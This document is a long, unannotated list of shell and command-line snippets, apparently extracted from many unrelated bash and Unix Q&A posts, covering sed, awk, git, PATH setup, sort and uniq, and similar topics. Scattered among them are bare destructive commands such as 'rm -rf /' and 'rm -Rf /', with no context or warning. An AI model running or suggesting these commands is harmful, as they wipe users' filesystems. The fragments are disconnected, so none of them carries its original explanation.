diff -r --brief
man bash
[[ "$string" == shellmatch* ]]
[[ "$string" =~ ^regexmatch.* ]]
[[ "$string" == "$shellmatch" ]]
zgrep log.*.gz
echo $i
ps -ef| grep mysql
Variable is
[ \n]
stty size
git push
( commands ) | command
( foo; bar )
sh -c 'foo; bar'
aws configure
git show
lpstat -a
cat /etc/lsb-release | grep DISTRIB_ID| cut -d "=" -f 2
cat /etc/lsb-release | grep DISTRIB_RELEASE| cut -d "=" -f 2
OSNAME := $(shell cat /etc/lsb-release | grep DISTRIB_ID| cut -d "=" -f 2)
lsb_release -si
GNU sed
man 5 syslog.conf
emacs --eval "(setq server-name '\"server1\")"
find /my_home ...
[: -: integer expression expected
[[ and ]]
cat /proc/1234/maps
cat /proc/1234/status
pmap 1234
cat /proc/$$/maps
mysql -uUser -pPass database
show tables;
PROMPT_COMMAND='__git_ps1 "\u \W" "\\\$ " " [%s $(get_sha)] "; set_titlebar "$USER@${HOSTNAME%%.*} $(get_dir)"'
-bash: set_titlebar: command not found
screen -x
sudo su
script -f /tmp/www-data-scr.log
screen -x
$ gvim
$ vim
:echo $PATH
<(whatever ...)
#include <algol.h>
grep -v '^#' file |
print a,b,c
print charNames.a
import threenames
print a,b,c
kill ...
$ print_line 20
echo $VAR
pip install --user
rename 's/.*/expr/' *.jpg
Git Bash
git init
git init
git init
./main $(./script.py)
foo bar
"foo bar"
./main "$(./script.py)"
abc\ def
abc def
nf = split(rec,flds)
for i in {1..50}
ping -c1 www.google.com
&> /dev/null
&& break
help local
help declare
"${something:?Error message}"
Error message
man --pager='less -p ^"PARAMETERS"' bash
Special Parameters
man --pager='less -p "Parameter Expansion"' bash
man operator
printf 'something\n' >&2
$({ command | parser; } 2>/dev/null)
{ one_thing | another_thing; }
man --pager='less -p "Compound Commands"' bash
let _counter+=1
[[ is_it_true ]]
sudo smbmount //host_ip/media ~/media
man update-alternatives
sudo gedit ~/.bashrc
__vte_prompt_command: command not found
source /etc/profile.d/vte-2.91.sh
$ source ~/.bashrc
set -v
screen -D -R serverman
curl -o $varA.htm $varB
ps aux
awk 'BEGIN{print "Content-Type: text/html; charset="us-ascii""\n "<html>"\n "<Body>"\n "<table>"} {print "<tr>";for(i=1;i<=NF;i++)print "<td>" $i"</td>";print "</tr>"} END{print \n</Body>"\n "</html>"\n"</table>"}' a.txt >> email.html
ps aux
find . -name "*.gz*"
sed 's/\.gz//'
sed 's/(\.gz)//'
mv ... ....
while read
while IFS= read -r -d $'\0'
gzip -c $1 > $1.gz
sort file1 | uniq > file2
sort -u
sort -u
sort | uniq
sort -u
Ubuntu 18.04
CentOS 6
cat sample.txt | uniq
cat sample.txt | sort -u
sort | uniq
sort -u
echo $?
vim dump.md -c 'vsplit poa.md' -c 'split one.md' -c ':wincmd h'
vim dump.md...
$r two
$ a
sed -i -e '$ a ...
ffmpeg -i  rtsp://172.19.1.34/live.sdp -acodec copy -vcodec copy b.mp4 2>>log.txt 2>&1
ffmpeg -i  rtsp://172.19.1.34/live.sdp -acodec copy -vcodec copy b.mp4 2>log.txt
rm -rf /
sed -n '/start-marker/,/end-marker/p' <(echo -en "first line\nstart-marker\notherline\nend-marker\nmore\na")
this.foo = { x: 0, y: 0, z: 0 };
< or > cpuTime
1.638 * 12 = ~20 seconds
my virtual address = 00d66d7e
less "file:name.txt"
nohup sh xyz.sh>>del.txt &;
sleep 10
pgrep -P 9651
pgrep -P 9651
sleep 10
sleep 10
echo "keys: $keys"; echo "values: $values"
sudo apt-get install jq
sudo yum install jq
awk -F
gnu awk
xargs -n50 < file
tr '\n' '\t'
paste -s
printf '%s ' $(< file)
printf '%s ' $(cat file)
$(< ...)
git config core.autocrlf false
:set fileformat=unix
gradle wrapper
:e ++ff=dos
echo $(echo part1)$(echo part2)
sort -R
uniq -c
dir1: <output files from run 1>; dir2 <output files from run 2>
which java
'[= ]+'
{ print }
cat /path/to/mainFolder/Folder1/File1
service mysql stop
-a ARRAY
ruby -v
ruby 2.1.1p76 (2014-02-24 revision 45161) [x86_64-darwin13.0]
rbenv install 2.1.0 && rbenv local 2.1.0
spring stop
echo $x
echo "$x"
man bash
for ((i=0;i<$max_columns;i++)); do
"accessKey": "OO"
"accountID": "99"
!w bash
FIELD SEPARATOR
git commit -m "fix things"
commit -m
esxcli network ip get
which esxcli
echo $PS1
tr -d '\1\2' <<< "$expanded_PS1"
echo "${PS1@P}"
"/NET: .... $var/p"
docker run -i -t base /bin/bash
echo "$(( "$k" + 2 ))"
echo "$(( \"$k\" + 2 ))"
man bash
cd -
tac file
mplayer "jungle_gremlins_of_java.avi"
"scale=2; $var1/$var2" | bc
5.00 5.00 5.00
echo "$THING"count=value
EXIT STATUS
REPORTING BUGS
info man
info info
man info
man man
Ctrl + D
od -t x8 -N 8 -A n </dev/random
echo $PATH
sort -u
i between 1 and n - 1
line(n - 1) - line(n)
df -BM
python /path/to/script.py
cd ../to/your/directory && python script.py
hg merge --tool internal:merge
hg resolve --list
hg update -C .
< file
-f a.txt
touch 10gen.repo
sudo yum install mongo-10gen mongo-10gen-server
((ecx & 0x80000000) != 0)
$hostname, $cpuvalue and $memvalue
10 11
if [ $e == 0 ];
if[ e == 0 ];
if ( x > y )
if[ e == 0 ]
if [ e == 0 ]
if [ $# == 3 ]
if[ $# == 3 ]
[ e == 0 ]
[ $e == 0 ]
man test
sudo script.sh
su -c "mv trash /home/user/" user
grep -v
rm -Rf /
-c %a
ls foo.bar | awk '{print $1}'
awk -F ''
awk -F
less -r
less -R
find . -name \*strelka\* | grep '.vcf$'
chmod 755 nameofscript
[ -f "$file" ]
[[ -f $file ]]
sudo -u user1
man 5 sudoers
sed '/^$$/d' yourfile.csv > newfile.csv
[ \t\r]*
tcpdump -c1 ...
while read
tcpdump -l
echo $b
echo "$b"
sort -nk4 newLapTimes.txt -o newLapTimes.txt
sed -n '1!N; s/^INBOUND>>>>>.*\n.*from \([0-9.]*\).* to \([0-9.]*\).*\n.*, Message type: \([A-Z_]*\).*/\1 \2/p'
sed -n '1!N; s/^INBOUND>>>>>.*\n.*from \([0-9.]*\).* to \([0-9.]*\).*\n.*, Message type:\([A-Z_]*\).*/\1 \2/p'
Message type:
( )
( )
{ }
sort -f *.csv > output.csv
sort -t, -V *.csv > output.csv
sort -t, -k 2.3 -g fileName
$( ... )
v='  val'; echo $v$v
echo "$jpat"
jpat=$(printf "  %6i\n"  "$jj")
## Screenshots ##
4. line 4
## Changelog ##
## foobar ##
## Changelog ##
sed -n '/## Screenshots ##[^#]*/p'
## Screenshots ##
echo "$PROJECT - $DBPASS"
man df
echo -e
less -R file.txt
echo -e
echo -e
(( ))
(( $tomatch += $size ))
echo "$line" >> "${line:0:2}_out.txt"
bash -x
if [ $len -eq 0 ];
tables=("a" "b" "c")
script.sh foo bar baz
script.sh foo,bar,baz
$len -eq 0
i=0; i < $len; ++i
if (( !$len )); then
foo='a,b,c'; tables=($foo)
tables=(a b c)
for i in "${!tables[@]}"; do
printf table %s\n' "${tables[@]}"
option requires an argument error -- d
man getopts
sort | uniq -c
sort | uniq -c
cat f1 f2 ...
sort | uniq -c
sort | uniq -c
help [r]ead
awk -F
CREATE & TABLE
CONF_FILE_CONTENT=`cat ${CONF_FULL_PATH}`
$(dirname $ROOT_PATH)/$(dirname REL_PATH)/$(basename $CONF_FILENAME)
Git Bash
echo $BASH_VERSION
chmod o+r
chmod o+x
' '
" "
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
bash clearcsv.sh
*/6 * * * * /home/pi/clearcsv.sh
*/6 * * * * cd /home/pi && bash clearcsv.sh
echo $ME
hive -f /local/path/to/file
hive -f hivescript
"Main class [org.apache.oozie.action.hadoop.ShellMain], exit code [1]"
shopt -s extglob;
man bash
Pattern Matching
shopt -s extglob
shopt -u extglob
echo 'export PATH=/usr/local/mysql/bin:$PATH' >> ~/.bash_profile
. ~/.bash_profile
grep -v
sudo opensnoop | grep TextEdit.*open.txt
Sublime Text 2
set -x
GNU awk
gnu awk
wget --spider $url
php /path/to/real/file.php
grep -r CMAKE_C_COMPILER_ID
gnu sed
export PATH=$PATH
export PATH=$PATH
export PATH=$PATH:/usr/local/bin
exec screen
startx &
startx &
awk '/pat1/,/pat2/'
Error: Cannot start container f6e1084236794548bbd5cd059f46f916367106bf38ec24ad30ceefb9fb015291: fork/exec /var/lib/docker/containers/f6e1084236794548bbd5cd059f46f916367106bf38ec24ad30ceefb9fb015291/root/.dockerinit: invalid argument
sudo docker run -i -t ubuntu /bin/bash
sudo docker run busybox echo hello world!
basename $0
$(dirname "aaa")
while read
"complete -p | grep time"
/bin/sh -c
Job start/end time=
cause the " * " will search for all files
$echo "*"
$echo \*
set -xv
set -xv
set -xv
swapon -s
Filename                                Type            Size    Used    Priority
if [[ $(swapon -s | wc -l) -gt 1 ]] ;  then echo "OK" ; else echo "Bad" ; fi
if [[ $(swapon -s | wc -l) -gt 2 ]] ;  then echo "OK" ; else echo "Bad" ; fi
(( i++ ))
let j++
declare -i
(( $i++ ))
"$(tput setf red)"
"$(tput setf black)"
find . -mindepth 2 -type d -mtime 3
"$(cd "$(dirname "${BASH_SOURCE\[0\]}")" && pwd)"
echo -e "$SITE"
echo "$SITE"
while read
IFS=$'\r\n' LINES=($(grep -w $1 some/path/*/file))
$"Hello World."
man bash
$(find ...)
./easyrsa build-client-full client
Ignoring unknown command option:
"-passout stdin"
"-passout file:passfile"
local opts=
(echo $pass; echo ...)
-passin stdin
-passout file:passfile
opts="-passin stdin"
grep -v -F -f dictionary
tee /dev/tty
ls -l | grep -c poem > file.txt
sleep 6; echo testings
cat test.txt
echo -e
$author \t $title \t
$i ~ /[,"]/ && $i !~ /^".*"$/
gsub("\"", "\"\"", $i)
$i = "\"" $i "\""
perl -wnlp -e 's/\t/,/g;' input_file.tsv > output_file.csv
perl -wnlpi -e 's/\t/,/g;' input_file.txt
perl -wnlpi -e 's/\s+/,/g;' input_file
npm install
su nonroot
/bin/bash install.sh
su -c "some-program" nonroot
some stuff.........<br/><br/><br/>http://example.com/copythislink.php<br/><br/>After you.........some more stuff
(?!<br/><br/>After you)
<(command line)
<( )
FS="\n" RS="! ----"
"-m64 -D ACIS64"
node: command not found
node -v
js2coffee: command not found
[ ]
kill -0
find . -name '*' | xargs wc -l
grep -rl 'originalCode-01-NoPlugin-' ./ | xargs wc -l
sed -i "s/_v//g" fileName
(( ))
set -e
A=0; ((A++))
man bash
/bin/sh scriptname
[[ $a -gt 2 ]]
[[ ${inside[0]} != "remora.txt" ]]
while read ...; do ...; done <  <(somecommand)
grep --color=auto
(   &)
(    ) &
(tty &)
(tty) &
(setsid startx &)
(setsid startx) &
( ... &)
grep -e "Body1" -A 2 -e "Body3" -A 3
file1 file2 file3
--arg VARIABLE VALUE
-D FOO
--passphrase-fd 0
cat keyfile > &3
--passphrase-fd 3
<a title="Download this file..." target="_blank" href="http://webaddress.domain.org/videos/sometext/file_name_12.mp4">
gnu awk
--type --size
--create --name
my_executable ${ARR[@]/#/-f }
"-f aa" "-f bb" "-f cc dd"
bash -x script.sh
set -xv
set -xv
set +xv
export PS4="\$LINENO> "
source bash_profile
./program "input/file" &> "output/file"
| tr -d '\015'
bash: obvfake: command not found
find . -type -d -exec sh -c '(cd {} && cat {}.Y1.txt {}.Y2.txt)' ';'
service supervisor restart
Restarting supervisor:
unix:///var/run/supervisor.sock refused connection
service supervisor restart
unix:///var/run/supervisord.sock no such file
date -d "-1 day"
-d option
man date
>> $LOGFILE 2>&1
>> $LOGFILE
echo "$MYCRON" > $NEWCRONTAB
$DIRPARAMETER >> $CTLOGFILE 2>&1
umask 077
>> $LOGFILE 2>&
au arg1
au arg1
$ php app/console example:command
man bash
./foo.sh < infile
hg branch
hg branch 2>/dev/null
$ hg branch 2>&1 | awk '{print "test: "$0}'
hg branch
hg branch
03/17/2014 13:48:40.016- null - PFM_DIP_SERVER_001:Virus infected content detected while scanning file; File name: 2MBVirusTextFile.txt
ps -ef | grep 489
gdb -p <pid>
ps ax | grep <My Script's Name>
Content-Type: text/plain; charset=us-ascii
-printf "%p\n"
[ "$1" -gt 0 ]
rec $(($1-1))
rm -rf ... \nonexistent_directory
rm -r \nonexistent_directory
-exec rm ...
-exec rm ...
-maxdepth 0
rawMessages=$(git log --pretty=format:'%h|%an|%s«' --max-count=10)
rawMessages=($(git log --pretty=format:'%h|%an|%s«' --max-count=10))
git pull --rebase
set -o pipefail
|| if ...
set -e
set -o errexit
set -o pipefail
no such file and directory
no such file and directory
vi /etc/paths
ls -l /etc/paths.d
rm /etc/paths.d/path_you_dislike
echo $PATH
path variable
Mac terminal
echo $PATH
echo $PATH
nano $HOME/.zshrc
# If you come from bash you might have to change your $PATH.
# export PATH=$HOME/bin:/usr/local/...
source $HOME/.zshrc
$ ls -a 
echo $PATH
sed "s/s/n/g"
sed "s/s+/n/g"
man 1 df
sed 's/"\u"[a-z][0-9]//g' input
[   ]
from \u00a37.
while (<>) { }
head -1
ls -l
sudo chmod a+x <PATH TO MY HOOK.SH>
execFile('/path/to/hook.sh', execOptions, function(error, stdout, stderr)
set -x
split($27, a)
date -d
find ... | wc -l
[ -d "$@" ]
man test
cmdlist="${cmdlist//cmd/ }" #To get index of command
[[ length -gt 3 ]] && [[ length -le 5 ]]
grep -c
which android
your_sdk_path/tools/android update project --paht
cd $SCRIPTPATH
|| exit $?
|| exit %ERRORLEVEL%
export EDITOR=emacs
export VISUAL=gedit
man bash
2>&1 | tee
perl -e
python -c
ssh -tt
LANG=C sed '...'
bash -s
dos2unix your_script_file
sed -i $'s/\r//' your_script_file
tr -d '\r'
var=${wc -l a.txt}
wc -l a.txt | read line
wc -l < a.txt
wc -l
mvn -f ./cmroad-api/pom.xml clean install corona:package -Ddebug=false; mvn -f ./cmroad-impl/pom.xml clean install corona:package -Ddebug=false
[ERROR] Unknown lifecycle phase "mvn". You must specify a valid lifecycle phase or a goal in the format <plugin-prefix>:<goal> or <plugin-group-id>:<plugin-artifact-id>[:<plugin-version>]:<goal>.
mvn mvn
if [[ -f c.txt ]]
exec 200<> file
flock 200
flock filename
bash -x script.sh
D IMEI_14 IMEI_15 REASO TIME_ADDE TIME_TO_B NOTIFIED_TO_NETWORK C_FIRST_DETERMINATION_GROUP ---------- -------------- --------------- ----- --------- --------- ------------------- ------------------------------------ 123456789 222222224444444 2222222244444444 9999 09-DEC-13 14-DEC-13 0 ID IMEI_14 IMEI_15 REASO TIME_ADDE TIME_TO_B NOTIFIED_TO_NETWORK C_FIRST_DETERMINATION_GROUP ---------- -------------- --------------- ----- --------- --------- ------------------- ------------------------------------ 1234567829 2222223344444444 22222233444444442 9999 09-DEC-13 14-DEC-13 0
echo "$result"
-e $(printf '\t')
| od -c
/bin/echo -n foo
/bin/echo foo
echo -n foo > /tmp/bar
/bin/echo --help
/bin/echo -n foo
$ heroku config
seq 1 100 | zenity --list --column number
<column 1 value> <column 2 value> <column 1 value> <column 2 value> ...
(without "" and each of them in a new line (not sure, why it is not shown correctly here))
&& NF
GIT_AUTHOR_NAME, GIT_AUTHOR_EMAIL, GIT_AUTHOR_DATE, GIT_COMMITTER_NAME, GIT_COMMITTER_EMAIL, GIT_COMMITTER_DATE, EMAIL
git pull
git pull
echo foo | (read msg; echo $msg)
signal 13
read msg
git pull ...
git pull
while <list> do <list> done
not currently on any branch
read msg
git pull
git diff-tree
help [
sort -u
[ "$duplicates" = yes ]
uniq -d
grep . -c
wc -l
(( ))
[ ]
myprogram >> file
tail -f file
tail -f
var=$(app_a | app_b)
hashed=$(echo "blah" | openssl dgst -sha512)
echo $hashed
#mysql -u root -pmypassword testDatabase < cleanup.sql
show full processlist;
print $0
print $0
sed -e '/../r file.txt
cat otherfile
ls -l
sed -i -e '/cdef/r insert.txt' input.txt 
printf "%s\n" "/cdef/r insert.txt" w | ed -s input.txt
Sublime Text 2.app
Sublime Text.app
export PATH
subl .
subl filename
export MULE_HOME=/opt/mule-standalone-3.4.0
source ~/.bashrc
touch ~/.zshenv
open -a TextEdit.app ~/.zshenv
export NAME=path
export PICO_SDK_PATH=/Users/[redacted]/Developer/pico-sdk
awk -F"[xE][0-9]" '{print $1}'<<<$list
gnu awk
set -/+x
-i keyfile
hg pull -u
export HOME=/root
touch /root/bla
import os
cp -R vendor/* .
echo VAR_${PROFILE1}_${SERVER1}
cat /dev/fb1 > framebuffer.contents
cat framebuffer.contents > /dev/fb1
read -r
openssl enc --help
source /etc/profile
. ./yourScript.name
source yourScript.name
$(find ...)
< <(...)
[[ expr ]] &&
wget --user-agent="string with spaces"
wget "--user-agent=string with spaces"
wget "$useragent"
~/projects/project @ master : 8675309  - \033[0;32m Δ \033[0m
GNU bash, version 3.2.51(1)-release (x86_64-apple-darwin13)
IFS=foo read
var=value command args...
sed '/[A-Za-z]{}!@$%&().,;'"/,$d' input
> output.txt
$var != *[^0-9]*
example text
chmod 755 myScript
example text
python mergeParenthesis.py a.txt b.txt
>( )
echo $PATH
wc -l
uniq -dc
wc -l
uniq -d
wc -l
sudo cdrecord -v -eject -multi speed=16 /tmp/newcd.iso
sh .filename.sh
sh filename.sh
. .filename.sh
which lilypond
export PATH=~/bin:"$PATH"
ps -ef ....
set -vx
linux bash
jq -r '.key1' jsonFile
aaaa bbbbb
ln -s /foo/* /bar/tmp/.
{ print $1 }
grep -Pzo
tr '\n' '\r'
sed 's,\(.*</div>\).*,\1,'
tr '\r' '\n'
grep -E '*\-' minilemario.txt
xz -c
xz --verbose --list FILE.xz
hd big.log.sp0.xz |grep 7zXZ
tail -c
tail -n1
gzip --verbose --list
apt-get install dictzip
xz -0
xz -0
xz -0
xz -0
$ gztool -t foo.gz | tail -1
cat 1.ini | awk '{print "export "$0}'
source .bashrc
curl www.xyz.com/asdd
curl -s
xargs -I{} curl -s {} <sitemap | grep title
xargs -I{} curl -s {} <sitemap | grep -o "<title>.*</title>"
"${line}" =~ ".*ERIKA.*"
"${line}" =~ "ERIKA"
ssh user@host "your_alias"
check = 'b'
printf '%e\n', $s
print $s
man proc
gcc -o grabmem grabmem.c -std=c99
nohup echo Hello > /dev/stdin 2>&1 &
touch -r
scp -p
touch -r
man column
"\1 is decoded to "
's/(.+)$/\1 is decoded to /'
git show
git log
git log
git show
git log
git show
git rev-parse HEAD
ref: refs/heads/master
$# -gt 0
git status
timeout 60s git clone ...
spawn "ssh user@server"
GNU bash, version 4.2.25(1)-release (i686-pc-linux-gnu)
Linux 3.2.0-60
Linux 2.6.30
GNU bash, version 3.2.0(1)-release (sh-unknown-linux-gnu)
grep -oP '(?<=\[)[^[]*(?=\])' input
export CFProcessPath="$0"
grep: memory exhausted
sed '0,/^banana$/d'
sed -n "/$variable/,\$p"
sed -n "/^$variable\$/,\$p"
sed -n "/^$variable"'$/,$p'
echo "$str" | sed -n '/banana/,$p'
sed i
sed -i
sed s/something/replacement/g
npm -g bin
npm install -g karma
ls -la /usr/local/bin
npm -g root
brew postinstall node
brew postinstall node
sudo rm -rf /usr/local/lib/node_modules/
gnu awk
man at
export DISPLAY=:0.0
$? == 0
$? != 0
Updating (122 files)
indexes=( ${string//,/ }
indexes=( ... )
names=( ... )
sed ... <<< "$string"
's/,/ /g'
1 2 3
$( ... )
GNU awk
</li> plus linefeed
:help -s
:help -s-ex
date -d
GNU date
perl "Makefile.PL" INSTALL_BASE=/usr/local
dnf install prename
pacman -S perl-rename
pkg install p5-File-Rename
Debian like/Ubuntu
apt install rename
cd $CLASSES_TAKEN
help declare
passwd -l
in ...
[ ... ]
I want to be able to go through each line and add all the numbers in the row and if the row's total is greater than 0 than print the line if not then do not print it.
I want to be to just know how to go print a number for how many lines there are
man bash
man bash
printf "%s\n" …
$git push
Hello world
['tmp', 'etc', 'var', ...]
['Hello', 'world', 'tmp', 'etc', 'var', ...]
[ -s "${i}_1" ]
wait $pid
pkill -f clipit
kill $(ps -eo pid,comm|grep clipit|grep -v grep|cut -d' ' -f1)
kill "$clipitPid"
kill $clipitPid
aaa222 bbb222
aaa111 bbb111
$(echo {} | sed 's/111/222/g')
| & ; ( ) < >
* ? [ ]
echo 'a\b' | xargs # -> 'ab'
printf '%s\n'
printf '%s\n
mcopy -i image.img bin.bin ::
echo "O" | mcopy -i image.img bin.bin ::
{ sleep 2; echo "O"; } | mcopy -i image.img bin.bin ::
(diff in bash)
bash ...
count how many letter there are in each word
$ echo 'export PATH=$PATH:/root/scripts/RotateVideos' >> ~/.bashrc && source ~/.bashrc
cd /root/scripts/RotateVideos && bash s3-get
100 files
40 files
60 files
Python subprocess
exit 102
import requests
import sys
print sys.version
import requests
chmod 755 /usr/lib/cgi-bin/hello.bash)
firefox /usr/lib/cgi-bin/hello.bash
* * * * * /home/ahmed/Desktop/run.sh
[ $W1_Judge != 0 -o $S1_Judge != 0 ]
if [[ "${jgWS[${!DESC1}]}" == "WSNG" ]]
sed "s/<%\(.*\)%>/$(eval \1)/g"
-bash: 1: command not found
{print $3}
* * * * * /home/ahmed/Desktop/run.sh
V1=one two three four
"one two three four"
alias name
for file
[[ $file != *codegroup* ]]
mv $file ${var%.*}codegroup.${var##*.}
grep -o
| tr '\n' ' '
man bash
do ... done
{ ... }
do ... done
{ echo Hi; }
if { echo Hi; }; then echo Lo; fi
java Main "First_Line" "Second line with spaces"
exit 1
git init --bare
scale = 2
man bc
egrep: repetition-operator operand invalid
grep -Po
mkdir -p
git mv -r js/*.js js/*.1.js
grep --text 'ANS_LENGTH=' log.txt | sed -e 's/[^[[:digit:]]]*//g'
sed -e 's/[^[[:digit:]\.]]*//g'
gnu awk
expect eof
sleep 10
ls -tr
ls -r
set -e
set -e
set -e
man bash
set -e
set -e
[[ expression ]]
echo moo | grep o
man grep
netcat -C
netcat -t
netcat -u
exec('nohup /path/to/bashscript')
exec('/path/to/bashscript | at now')
bash 3.2
read -i
bash 4.0-alpha
echo $PATH
echo "$f"
associative arrays
has_option foo
sh math
bash math
theArtist and theName
Pink Floyd
which python
which python
export PATH="/Users/mbatchkarov/anaconda/bin:$PATH"
| sort -u
find /your/dir -type f
awk -F. '{a[$NF]} END{for (i in a) print i}'
git ls-files -m
files=(git status | grep '^\s*modified:' | cut -f 2- -d :)
while read line
stty -echo
stty: standard input: Inappropriate ioctl for device
trap "break" SIGINT SIGHUP SIGTERM
stty: standard input: Inappropriate ioctl for device
for loop
[[ ... ]]
[[ ... ]]
shopt -s dotglob
/home/yaal/temp/hatch/* /home/yaal/temp/hatch/.*
nohup command &
grep sqlplus | grep -v grep
pgrep sqlplus
grep sqlplus
$(( ))
$[ ]
(( ))
the date is (Dec 2013).
Dec 2013
awk: illegal statement at source line 8 source file script.awk
read -u 5
4 4
4 1
ls -l
ls -l
ls -l
ls -l
ls -l
rvm get stable --auto-dotfiles
$rvm --debug get head
rvm system
$echo $PATH
$rvm docs generate-ti
export PATH="$PATH:$HOME/.rvm/bin" # Add RVM to PATH for scripting
export PATH="$HOME/.rvm/bin:$PATH" # Add RVM to PATH for scripting
ruby-head [ x86_64 ]
rvm remove ruby-1.8.7-head
Amazon Cli tools
ec2 audit script
tags like name, owner, cost centre
<file tr ',' '\n'
bash if
[ ... = ... ]
[[ ... == ... ]]
#! /bin/bash
[[ ... ]]
[ ... ]
"ls; pwd"
./program --help
./program --usage
./program -h
./program --this-option-is-a-lie-or-some-other-bogus-option-to-give-usage-information
cat some_file | function | ...
ls "/"
ls /
ls \"/\"
ls "/"
IFS= read -r line
awk -v awkvar="$shellvar" ...
sed 's/[0-9]*//;s/ *//'
sed 's/hello/bye/'
sed 's/hello/bye/g'
sed -i ...
[letter]...[a dot][letter]...[a colon]
<( )
ls -l
-a /
#! /usr/bin/env python
export PATH
’, ‘\’, and, when history expansion is enabled, ‘!’. The characters ‘$’ and ‘
xpath "//record[customer='$id' and record='$rec']"
--var name="$value"
_ID=$(echo $CURL_OUTPUT |awk '{print $2}' FS='url":' |awk '{print $1}' FS=',' | awk '{print $2}' FS='"'|awk '{print $4}' FS='/')
sample scripts = OK
sample scripts = FAIL
-bash: sample_script: command not found
type -p
pathto script
#!/usr/bin/env bash
bash <script>
shopt -o posix
echo -e
echo -E
shopt -o posix
awko data1 data2
csplit file.txt /^$/ {*}
mv: rename /src/foo.wav to zzz - /dest/foo.wav - copied 201403261800.wav: No such file or directory
find . -type f
zzz - ./passwd
zzz - .
#!/usr/bin/env bash
[[ ... ]]
[ ...]
[ $input != 5 ]
[[ $input != 5 ]]
if [ -d $finput ] ; then ...
set -xv
set +xv
seq 567 572
prev > 0
&& prev + 1 < $1
$ mysql -h $your_IP =P 3306 -u username -p
python manage.py test and python manage.py testserver
'PORT': '3360',
TAG : Name,cost.centre,Owner and the instance id
sed -r 's/(.* )(.*)\/(.*)$/\1\3/g'
grep "^d"
find . -type d
sub($NF, " "a[n])
awk '{...}1'
-F '[0-9]+:[0-9]+ '
icanon echo echok
stty -a
icanon, echo, echok
test.sh input.txt
set -o pipefail
sed ... | dlg ...
Runtime.getRuntime().exec("some command");
ps -fu user | grep matching_string
ps -fu user | grep matching_string
grep matching_string
ps -fu user | grep matching_strin[g]
grep matching_strin[g]
((a++)) && ((b++))
man bash
echo $( command )
man bash
NR%4==0 {$0=$0""++incr}
{print $0}
zsh --myprompt="yes master? >"
export PS1='yes master? >' zsh/bash
bash --rcfile /usr/local/share/.fancypromptrc
zsh --rcs /usr/local/share/.fancypromptrc
/c/path (branch)
notepad ~/.bashrc
c:\Program Files\Git\etc\
Git Bash.vbs
C:/Program Files/Git/etc/profile.d/git-prompt.sh
git config --list
git config user.name YOUR_USERNAME
git config user.email YOUR_EMAIL
run_MACS.mk:12: *** missing separator.  Stop.
#!/usr/bin/env bash
[ -f $TMP_FILE ] && exit
[ -f $TMP_FILE ]
test -f $TMP_FILE
man test
set -e
#!/usr/bin/env python
find . -type d -exec echo "{}" \;
grep -P
`top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print $1}'
arithmetic expression: expecting EOF: "6*93.4"
mongo client
MongoDB shell verions: 2.2.4
or die
read ARGV
or die $!
seek STDOUT,-1024,1
use strict;
or die $!
$rev = '';
$rev = '-' x 1024;
sed '1s/^/#/' myfile
sed '2s/^/#/' myfile
[user inputs an email]
uniq -u
mkdir -p
[ cmd ]
grep "SCF Done"
grep "SCF Done"
chown -R user:group [directory]
chmod -R 754 [directory]
sudo python setup.py install
echo $PATH | grep Postgres.app
while loop
>> /batch/backup.log
00 00 * * * /batch/backup.bat >> /batch/backup.log
git diff
git diff --no-index
git diff
git diff
git diff
git diff
git diff
aws elb describe-load-balancers --load-balancer-names awseb-e-i-AWSEBLoa-12*****0U --region us-east-1 --query "LoadBalancerDescriptions[].AvailabilityZones[]" --output text
sed 'y/.-+§/D_P-/'
grep -o 'aaa\w*' * >>out
awk -F'[:]' '{print $2}' file.txt
b=${a%'Message :'*}
grep -A1 Message | tail -1
${a%'Message :'*}
man bash
ls -l
-exec ... {} +
{} ';'
${i/* /}
-F' *: *'
$( )
/  /
cut -b -10
substr($2, 0, 10)
dog,"john "bud" smith",cat
dog|john bud smith|cat
bash -x
+ . some_file
bash -lx
pushd /pathTo; ./script.sh; popd
seq 7 | paste - -
head -1 temp.lst
var=value cmd ...
sed 's/\(\foo\).*\(\var\)/\U\1\2/' testfile.txt
(foo )(.*)( var)
pip install --user csvkit
Requirement already satisfied
which csvcut
pip install csvkit
-a": 1: -a": Syntax error: Unterminated quoted string
echo $cmd
sh -c "ls -a"
set -xv
set -xv
#! /bin/bash
#!/usr/bin/env bash
cat -v scriptFile | fgrep ^
dos2unix file
sed 's/'$'\r''$//' file > outfile
tr -d '\r' < file > outfile
|xargs aspell -c
xargs -L 1
echo 'XXXX' | sudo /opt/lampp/lampp start &
mysql -u root
source /usr/local/insert.sql;
mysql -u root --execute="source /usr/local/insert.sql; \q"
paste -d <(cut -d "," -f 3,7 f1) <(cat f2)
pr -mts,
ASCII text, with CRLF line terminators
tr -d, "\r" < f1 > tmp && mv tmp f1
diff -r dir1 dir2
rsync --dry-run
uniq -u
if !(starting%7==0 or starting%11==0 or starting%13==0) => echo starting
echo 'whatever'
<span class="cur_wind">
echo foo bar
foo bar
foo bar
grep -o '[^,]*$' < data.csv
choose -1
if [ condition ];then #dosomething fi
lsof | grep filename
git status
git cherry
svn checkout svn://server/repo/project/trunk -mtime -1d4h
-d "28 hours before"
--config-option config:miscellany:use-commit-times=yes
SELECT computer_name FROM machine WHERE serial_number = C02JT0XXXXXX;
id = 1
export -f somefunc
<the expanded value of $QUERY>
'(bunch of stuff) No such file or directory'
This is "$verbatim" stuff"Hello, World" More stuff
bash -c '...'
<span class="cur_wind">Sunrise <b>7:33 a.m.</b> <br />
extended globbing (extglob)
(Default on Linux)
arp -a
ec2-create-subnet -c garbage -i 10.0.0.0/24 -z garbage
nice -10 mycommand.sh
md5sum foto.jpg
md5sum fot.jpg
manage.py runfcgi pidfile=/var/run/myapp.pid
xargs -0
Process Explorer
readlink -f
mongo <dbname> --eval "db.<collectionName>.drop()"
tail -n 1
< $1
echo getInfo_arg_1="$1" >&2
chmod +x
set -x
#!/bin/bash -x
sudo dtruss -t fork -f -p {pidOfZsh}
zsh 5.0.2 (x86_64-apple-darwin13.0)
echo xxx >&2 | wc
(echo xxx >&2) | wc
read -d
xargs -0
find -exec
xargs -0
read -d
getconf ARG_MAX
read -d
find . -print0
find . -exec ...
xargs -0
parallel -0
read -d ""
find . -print
setopt globdots
sleep 10 &
[1] <PID>
java MyCode "Hello World!"
-bash: !": event not found
line 1: [-d: command not found
find . -exec cat {} | tr -d "\r" > {} \;
$0 ~ blockRegex
inBlock && $0 !~ blockRegex
$ which python
$ echo $PATH
"${SHELL:-sh}" -c "$*"
printf %q
printf %q
printf %q
